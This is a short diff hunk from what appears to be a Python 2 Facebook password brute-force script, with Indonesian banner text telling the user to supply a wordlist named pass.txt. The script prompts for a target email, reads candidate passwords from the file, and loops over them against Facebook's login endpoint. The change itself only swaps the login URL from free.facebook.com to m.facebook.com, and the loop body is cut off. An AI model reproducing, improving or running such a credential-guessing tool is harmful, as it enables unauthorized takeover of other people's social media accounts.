@@ -10,7 +10,7 @@ print "\033[92m================================="
 print "\033[92m[!] Pastikan Wordlist bernama pass.txt [!]"
 
 email = raw_input('email >')
-url = 'https://free.facebook.com/login.php?login_attempt=1'
+url = 'https://m.facebook.com/login.php?login_attempt=1'
 ex = open('pass.txt', 'r').readlines()
 
 for line in ex:
